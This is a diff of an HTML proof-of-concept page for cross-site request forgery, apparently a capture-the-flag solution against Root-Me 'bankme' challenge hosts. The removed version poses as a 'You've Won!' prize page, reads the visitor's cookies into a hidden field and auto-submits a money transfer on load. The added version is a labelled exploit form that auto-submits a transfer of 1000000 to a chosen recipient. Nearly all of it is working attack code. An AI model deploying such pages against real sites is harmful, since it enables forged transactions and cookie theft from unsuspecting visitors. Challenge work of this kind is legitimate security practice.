@@ -1,29 +1,24 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Special Offer!</title>
-  </head>
-  <body>
-    <h1>Congratulations! You've Won!</h1>
-    <p>Your prize will be processed shortly...</p>
-
-    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
-      <input type="hidden" name="recipient" value="caca">
-      <input type="hidden" name="amount" value="1000000000">
-      <input type="hidden" name="cookies" id="cookiesInput">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Exploit</h1>
+    <form id="transfer-form" action="https://bankme-2.challenges.pro.root-me.org/transfer/" method="post">
+        <div class="my-3">
+            <label for="recipient" class="form-label">Recipient:</label>
+            <input type="text" class="form-control" name="recipient" placeholder="johnny" value="amine">
+            <label for="amount" class="form-label">Amount:</label>
+            <input type="number" class="form-control" name="amount" min="0" max="1000000" placeholder="42" value="1000000">
+        </div>
+        <button type="submit" class="btn btn-rmp btn-rmp-secondary">Send</button>
     </form>
-
     <script>
-      // Récupérer les cookies
-      const cookies = document.cookie;
-
-      // Ajouter les cookies au formulaire
-      document.getElementById("cookiesInput").value = cookies;
-
-      // Soumettre le formulaire automatiquement
-      window.onload = function() {
-          document.getElementById("csrfForm").submit();
-      };
+        // Soumet automatiquement le formulaire lors du chargement de la page
+        document.getElementById("transfer-form").submit();
     </script>
-  </body>
+</body>
 </html>
